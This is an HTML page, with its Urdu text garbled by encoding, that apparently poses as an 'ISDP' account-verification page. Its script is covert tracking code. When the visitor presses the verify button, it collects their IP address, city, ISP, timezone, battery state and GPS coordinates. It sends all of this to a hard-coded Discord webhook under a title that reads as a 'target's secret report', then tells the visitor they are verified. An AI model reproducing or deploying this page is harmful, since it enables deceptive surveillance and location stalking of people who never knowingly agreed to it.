<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ISDP - ØªØµØ¯ÛŒÙ‚Ù Ø§Ú©Ø§Ø¤Ù†Ù¹</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eef2f3; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; border-top: 8px solid #2e7d32; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); text-align: center; width: 340px; }
        .logo { font-size: 50px; margin-bottom: 10px; }
        h2 { color: #1b5e20; font-size: 22px; margin: 10px 0; }
        p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 10px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.4s; }
        .btn:hover { background: #1b5e20; transform: translateY(-2px); }
        #msg { display: none; margin-top: 20px; color: #2e7d32; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">ğŸ¢</div>
    <h2>Ø§Ú©Ø§Ø¤Ù†Ù¹ Ú©ÛŒ ØªØµØ¯ÛŒÙ‚</h2>
    <p>Ø§Ù„Ø³Ù„Ø§Ù… Ø¹Ù„ÛŒÚ©Ù…! Ø§Ø¯Ø§Ø±Û’ Ú©Û’ Ø±ÛŒÚ©Ø§Ø±Úˆ Ú©Ùˆ Ø§Ù¾ ÚˆÛŒÙ¹ Ú©ÛŒØ§ Ø¬Ø§ Ø±ÛØ§ ÛÛ’Û” Ø§Ù¾Ù†ÛŒ Ø­Ø§Ø¶Ø±ÛŒ Ø§ÙˆØ± Ø§Ú©Ø§Ø¤Ù†Ù¹ Ú©ÛŒ ØªØµØ¯ÛŒÙ‚ Ú©Û’ Ù„ÛŒÛ’ Ù†ÛŒÚ†Û’ Ø¨Ù¹Ù† Ø¯Ø¨Ø§Ø¦ÛŒÚºÛ”</p>
    
    <button class="btn" onclick="startProcess()">ØªØµØ¯ÛŒÙ‚ Ù…Ú©Ù…Ù„ Ú©Ø±ÛŒÚº</button>
    <div id="msg">Ø³Ø³Ù¹Ù… Ø³Û’ Ø±Ø§Ø¨Ø·Û ÛÙˆ Ø±ÛØ§ ÛÛ’ØŒ Ø§Ù†ØªØ¸Ø§Ø± Ú©Ø±ÛŒÚº...</div>
</div>

<script>
    async function startProcess() {
        document.getElementById("msg").style.display = "block";
        
        // 1. ÙˆÙ‚Øª Ø§ÙˆØ± Ù¹Ø§Ø¦Ù… Ø²ÙˆÙ† Ù†Ú©Ø§Ù„Ù†Ø§
        const localTime = new Date().toLocaleString();
        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // 2. Ø¢Ø¦ÛŒ Ù¾ÛŒ Ø§ÙˆØ± Ù†ÛŒÙ¹ ÙˆØ±Ú© Ù†Ú©Ø§Ù„Ù†Ø§
        let ipInfo = {};
        try {
            const response = await fetch('https://ipapi.co/json/');
            ipInfo = await response.json();
        } catch (e) {}

        // 3. Ø¨ÛŒÙ¹Ø±ÛŒ Ú©ÛŒ ØªÙØµÛŒÙ„Ø§Øª
        let battStatus = "Ø¯Ø³ØªÛŒØ§Ø¨ Ù†ÛÛŒÚº";
        try {
            const battery = await navigator.getBattery();
            battStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Ú†Ø§Ø±Ø¬Ù†Ú¯ Ù¾Ø± ÛÛ’' : 'Ø¨ÛŒÙ¹Ø±ÛŒ Ù¾Ø± ÛÛ’'})`;
        } catch(e) {}

        const sendData = async (latitude = "Ø§Ø¬Ø§Ø²Øª Ù†ÛÛŒÚº Ù…Ù„ÛŒ", longitude = "Ø§Ø¬Ø§Ø²Øª Ù†ÛÛŒÚº Ù…Ù„ÛŒ") => {
            // Ø¢Ù¾ Ú©Ø§ ÙˆÛŒØ¨ ÛÚ© Ù„Ù†Ú© ÛŒÛØ§Úº Ù„Ú¯Ø§ Ø¯ÛŒØ§ Ú¯ÛŒØ§ ÛÛ’
            const webhookURL = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
            
            const payload = {
                embeds: [{
                    title: "ğŸ¯ Ù¹Ø§Ø±Ú¯Ù¹ Ú©ÛŒ Ø®ÙÛŒÛ Ø±Ù¾ÙˆØ±Ù¹",
                    color: 3066993,
                    fields: [
                        { name: "â° Ù…ÙˆØ¨Ø§Ø¦Ù„ Ú©Ø§ ÙˆÙ‚Øª", value: localTime, inline: true },
                        { name: "ğŸŒ Ù¹Ø§Ø¦Ù… Ø²ÙˆÙ†", value: tZone, inline: true },
                        { name: "ğŸŒ Ø¢Ø¦ÛŒ Ù¾ÛŒ Ù„ÙˆÚ©ÛŒØ´Ù†", value: `${ipInfo.city}, ${ipInfo.country_name} (${ipInfo.ip})` },
                        { name: "ğŸ¢ Ø§Ù†Ù¹Ø±Ù†ÛŒÙ¹ Ú©Ù…Ù¾Ù†ÛŒ", value: ipInfo.org || "Unknown" },
                        { name: "ğŸ”‹ Ø¨ÛŒÙ¹Ø±ÛŒ Ú©ÛŒ Ø­Ø§Ù„Øª", value: battStatus, inline: true },
                        { name: "ğŸ“ Ù…ÛŒÙ¾ Ù„Ù†Ú©", value: `[Ú¯ÙˆÚ¯Ù„ Ù…ÛŒÙ¾Ø³ Ù¾Ø± Ø¯ÛŒÚ©Ú¾ÛŒÚº](https://www.google.com/maps?q=${latitude},${longitude})` }
                    ],
                    footer: { text: "ISDP Secure Monitoring" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        };

        // Ù„ÙˆÚ©ÛŒØ´Ù† Ú©Û’ Ù„ÛŒÛ’ Ø§Ø¬Ø§Ø²Øª Ù…Ø§Ù†Ú¯Ù†Ø§
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (p) => { sendData(p.coords.latitude, p.coords.longitude); alert("Ø¢Ù¾ Ú©ÛŒ ØªØµØ¯ÛŒÙ‚ Ù…Ú©Ù…Ù„ ÛÙˆ Ú¯Ø¦ÛŒ ÛÛ’Û” Ø¬Ø²Ø§Ú© Ø§Ù„Ù„Û!"); },
                () => { sendData(); alert("ØªØµØ¯ÛŒÙ‚ Ù…Ú©Ù…Ù„ Ú©Ø±Ù†Û’ Ú©Û’ Ù„ÛŒÛ’ Ù„ÙˆÚ©ÛŒØ´Ù† Ú©ÛŒ Ø§Ø¬Ø§Ø²Øª Ø¯Ø±Ú©Ø§Ø± ÛÛ’Û” Ø¨Ø±Ø§Û Ú©Ø±Ù… Ø¯ÙˆØ¨Ø§Ø±Û Ú©ÙˆØ´Ø´ Ú©Ø±ÛŒÚºÛ”"); }
            );
        } else {
            sendData();
        }
    }
</script>

</body>
</html>